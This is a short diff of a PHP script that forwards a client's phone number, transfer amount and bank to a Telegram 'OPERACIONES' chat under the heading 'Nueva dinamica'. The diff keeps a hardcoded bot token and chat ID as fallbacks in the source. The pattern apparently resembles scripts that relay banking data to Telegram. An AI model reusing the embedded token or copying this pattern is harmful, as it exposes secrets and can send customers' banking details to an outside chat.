@@ -96,8 +96,12 @@ $montoTransferencia = $datosSolicitud['monto'];
 $nombreBanco        = $datosSolicitud['banco'];
 
 // ── Paso 4: mensaje + teclado inline al bot de Telegram OPERACIONES ──────────
-$botToken = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
-$idChat   = "-4923753161";
+// Lectura en 2 niveles: 1) variables de entorno Render (NUEVO canal), 2) fallback hardcode (canal legacy).
+// Así el mismo código sirve en AMBOS entornos sin necesidad de mantener dos ramas.
+$FALLBACK_BOT_TOKEN_OPS = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
+$FALLBACK_CHAT_ID_OPS   = "-4923753161";
+$botToken = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_OPS;
+$idChat   = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_OPS;
 
 $mensaje  = "🆕 Nueva dinamica:\n";
 $mensaje .= "📱 Celular: $telefonoCliente\n";
